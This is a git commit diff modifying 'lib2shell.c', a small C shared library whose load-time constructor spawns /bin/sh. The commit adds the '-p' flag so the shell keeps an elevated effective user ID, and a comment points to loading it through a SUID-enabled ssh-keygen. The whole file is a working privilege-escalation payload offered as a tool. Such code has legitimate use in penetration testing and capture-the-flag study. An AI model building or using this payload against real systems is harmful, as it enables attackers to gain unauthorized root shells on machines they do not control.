819d9dcfe2044fd43f463fa8a12e97e78a7dbc83
Jonas Heschl <heschl@protonmail.com>
2024-03-13 10:51:54 +0100

    Spawn an interactive shell while preserving effective user id

--- unix/lib2shell.c
+++ unix/lib2shell.c
@@ -1,15 +1,23 @@
 // Author: Sean Pesce
+// Modified by Jonas Heschl
 
 #include <stdio.h>
 #include <unistd.h>
 
 #define SHELL_PATH "/bin/sh"
-#define SHELL_COMMAND "/bin/sh"
  
 void __attribute__ ((constructor)) constructor()
 {
-    puts("[lib2shell by SeanP]");
-    printf("Starting %s\n", SHELL_COMMAND);
-    long long err = execl(SHELL_PATH, SHELL_PATH, "-c", SHELL_COMMAND, NULL);
-    printf("Result: %lld\n", err);
+	puts("[lib2shell by SeanP, modified by Jonas Heschl]");
+
+	// Check which effective user id the library is executed with.
+	// Mostly relevant in situations where (ssh-keygen) is run with SUID set.
+	printf("Current effective UID: %d\n", geteuid());
+
+	// We need to pass -p to the shell to stop it from dropping the effective user id.
+	// Not that -p is used by bash and dash (and possibly other shells) to deactivate this
+	// security measure. If you want to start another shell, you might have to change this switch.
+	long long err = execl(SHELL_PATH, SHELL_PATH, "-p", NULL);
+	printf("Result: %lld\n", err);
 }
+
